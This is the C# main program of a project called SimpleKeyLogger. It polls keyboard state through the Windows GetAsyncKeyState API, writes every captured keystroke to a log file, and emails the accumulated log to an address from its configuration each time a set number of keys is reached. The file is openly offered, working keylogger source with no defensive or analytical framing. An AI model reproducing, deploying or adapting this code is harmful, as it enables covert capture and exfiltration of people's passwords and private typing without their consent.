using Newtonsoft.Json;
using SimpleKeyLogger.EmailSender;
using SimpleKeyLogger.FileAdapters;
using SimpleKeyLogger.Models;
using SimpleKeyLogger.SignAdapter;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace SimpleKeyLogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [STAThread]
        static void Main()
        {
            bool endOfProgram = false;
            long numberOfKey = 0;
            string configText = File.ReadAllText("AppConfig.json");

            AppConfig config = JsonConvert.DeserializeObject<AppConfig>(configText);
            LoggerEmailSender sender = new LoggerEmailSender(config);
            TextFileAdapter file = new TextFileAdapter("log", "");

            LoggerSignAdapter loggerSignAdapter = new LoggerSignAdapter();

            while (true)
            {
                Thread.Sleep(10);

                foreach (int i in loggerSignAdapter.charSet)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == 32769)
                    {
                       
                        if (i == 27)
                        {
                            endOfProgram = true;
                        }
                        file.WriteToFile(loggerSignAdapter.GetSign(i));
                       
                        numberOfKey++;
                        break;
                    }
                }
                if (endOfProgram) 
                    break;

                if (numberOfKey % config.Limit == 0 && numberOfKey > 0)
                {
                    try
                    {
                       var task = sender.SendAsync("SimpleKeyLogger - TextLog", file.ReadTextFile());
                    }
                    catch (Exception e)
                    { 
                        Console.WriteLine(e.Message);
                    }
                }
            }
        }
    }
}
